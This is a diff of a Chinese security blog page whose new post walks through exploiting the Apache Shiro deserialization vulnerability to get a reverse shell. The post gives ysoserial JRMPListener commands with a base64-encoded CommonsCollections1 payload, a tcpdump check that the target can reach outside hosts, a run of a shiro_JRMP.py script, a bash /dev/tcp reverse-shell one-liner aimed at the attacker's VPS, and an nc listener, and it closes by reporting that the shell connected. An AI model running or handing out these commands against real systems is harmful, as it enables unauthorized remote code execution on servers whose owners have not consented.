@@ -6,14 +6,26 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>Archives: 2020/1 | ConanStudio</title>
+  <title>shiro反弹shell | ConanStudio</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="ConanStudio">
-<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;archives&#x2F;2020&#x2F;01&#x2F;index.html">
+  <meta name="description" content="shiro反序列化漏洞反弹shell">
+<meta property="og:type" content="article">
+<meta property="og:title" content="shiro反弹shell">
+<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;02&#x2F;11&#x2F;Shiro%E5%8F%8D%E5%BC%B9shell&#x2F;index.html">
 <meta property="og:site_name" content="ConanStudio">
+<meta property="og:description" content="shiro反序列化漏洞反弹shell">
 <meta property="og:locale" content="en">
+<meta property="og:image" content="https:&#x2F;&#x2F;conanstudio-1300441002.cos.ap-chengdu.myqcloud.com&#x2F;shiro%E5%8F%8D%E5%BC%B9shell&#x2F;1.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;conanstudio-1300441002.cos.ap-chengdu.myqcloud.com&#x2F;shiro%E5%8F%8D%E5%BC%B9shell&#x2F;2.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;conanstudio-1300441002.cos.ap-chengdu.myqcloud.com&#x2F;shiro%E5%8F%8D%E5%BC%B9shell&#x2F;3.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;conanstudio-1300441002.cos.ap-chengdu.myqcloud.com&#x2F;shiro%E5%8F%8D%E5%BC%B9shell&#x2F;4.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;conanstudio-1300441002.cos.ap-chengdu.myqcloud.com&#x2F;shiro%E5%8F%8D%E5%BC%B9shell&#x2F;5.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;conanstudio-1300441002.cos.ap-chengdu.myqcloud.com&#x2F;shiro%E5%8F%8D%E5%BC%B9shell&#x2F;6.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;conanstudio-1300441002.cos.ap-chengdu.myqcloud.com&#x2F;shiro%E5%8F%8D%E5%BC%B9shell&#x2F;7.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;conanstudio-1300441002.cos.ap-chengdu.myqcloud.com&#x2F;shiro%E5%8F%8D%E5%BC%B9shell&#x2F;8.png">
+<meta property="og:updated_time" content="2020-02-22T07:28:02.509Z">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https:&#x2F;&#x2F;conanstudio-1300441002.cos.ap-chengdu.myqcloud.com&#x2F;shiro%E5%8F%8D%E5%BC%B9shell&#x2F;1.png">
   
     <link rel="alternative" href="/atom.xml" title="ConanStudio" type="application/atom+xml">
   
@@ -153,49 +165,207 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-  
+            <article id="post-Shiro反弹shell" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
     
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2020" class="archive-year">2020</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/01/21/Jboss%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E8%AE%B0%E5%BD%95/" class="archive-article-date">
-  	<time datetime="2020-01-21T06:25:46.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-01-21</time>
-</a>
-        </div>
-    	 
+      <header class="article-header">
+        
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/01/21/Jboss%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E8%AE%B0%E5%BD%95/">Jboss反序列化漏洞记录</a>
+    <h1 class="article-title" itemprop="name">
+      shiro反弹shell
     </h1>
   
 
-        <div class="article-info info-on-right">
-          
-          
+        
+        <a href="/2020/02/11/Shiro%E5%8F%8D%E5%BC%B9shell/" class="archive-article-date">
+  	<time datetime="2020-02-11T07:03:41.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-02-11</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>shiro反序列化漏洞反弹shell</p>
+<a id="more"></a>
 
+<p>首先使用vps安装java 上传ysoserial-master.jar</p>
+<p>接下来将需要执行的命令转换为base64</p>
+<p><img src="https://conanstudio-1300441002.cos.ap-chengdu.myqcloud.com/shiro%E5%8F%8D%E5%BC%B9shell/1.png" alt="img"></p>
+<ul>
+<li>java -cp ysoserial-master.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections1 ‘bash -c {echo,cGluZyAxMxxxxxxxxxxxC4xNTM=}|{base64,-d}|{bash,-i}’</li>
+</ul>
+<p>JRMP监听1099端口</p>
+<p>开新窗口 启动：</p>
+<ul>
+<li>tcpdump -i eth0 icmp 抓ping包</li>
+</ul>
+<p><img src="https://conanstudio-1300441002.cos.ap-chengdu.myqcloud.com/shiro%E5%8F%8D%E5%BC%B9shell/2.png" alt="img"></p>
+<p>使用脚本执行</p>
+<ul>
+<li>python2 shiro_JRMP.py vps服务器ip:1099</li>
+</ul>
+<p><img src="https://conanstudio-1300441002.cos.ap-chengdu.myqcloud.com/shiro%E5%8F%8D%E5%BC%B9shell/3.png" alt="img"></p>
+<p>抓登录包</p>
+<p><img src="https://conanstudio-1300441002.cos.ap-chengdu.myqcloud.com/shiro%E5%8F%8D%E5%BC%B9shell/4.png" alt="img"></p>
+<p>有ip过来ping vps</p>
+<p><img src="https://conanstudio-1300441002.cos.ap-chengdu.myqcloud.com/shiro%E5%8F%8D%E5%BC%B9shell/5.png" alt="img"></p>
+<p>判断该ip可出网</p>
+<p>接下来反弹shell</p>
+<ul>
+<li>bash -i &gt;&amp; /dev/tcp/VPS服务器ip/7122 0&gt;&amp;1 </li>
+</ul>
+<p>base64编码</p>
+<ul>
+<li>java -cp ysoserial-master.jar ysoserial.eloit.JRMPListener 1099 CommonsCollections1 ‘bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xxxxxxxxxxMC4xNTMvNzEyMiAwPiYx}|{base64,-d}|{bash,-i}’</li>
+</ul>
+<p>执行java</p>
+<p><img src="https://conanstudio-1300441002.cos.ap-chengdu.myqcloud.com/shiro%E5%8F%8D%E5%BC%B9shell/6.png" alt="img"></p>
+<p>nc监听7122端口</p>
+<ul>
+<li>nc -lvp 7122 </li>
+</ul>
+<p>抓包发包</p>
+<p><img src="https://conanstudio-1300441002.cos.ap-chengdu.myqcloud.com/shiro%E5%8F%8D%E5%BC%B9shell/7.png" alt="img"></p>
+<p>shell弹回来了</p>
+<p><img src="https://conanstudio-1300441002.cos.ap-chengdu.myqcloud.com/shiro%E5%8F%8D%E5%BC%B9shell/8.png" alt="img"></p>
+
+      
+
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
+        </div>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2020/02/11/Shiro%E5%8F%8D%E5%BC%B9shell/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
+  
+<nav id="article-nav">
+  
+    <a href="/2020/02/12/Jenkins%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/" id="article-nav-newer" class="article-nav-link-wrap">
+      <i class="icon-circle-left"></i>
+      <div class="article-nav-title">
+        
+          Jenkins未授权访问漏洞
+        
+      </div>
+    </a>
   
   
-    </div></section>
+    <a href="/2020/01/21/Jboss%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E8%AE%B0%E5%BD%95/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">Jboss反序列化漏洞记录</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+  
+  
   
 
-    
+  
+
+  
+
+  
 
 
           </div>
@@ -218,8 +388,8 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
-		isArchive: true,
+		isPost: true,
+		isArchive: false,
 		isTag: false,
 		isCategory: false,
 		open_in_new: false,
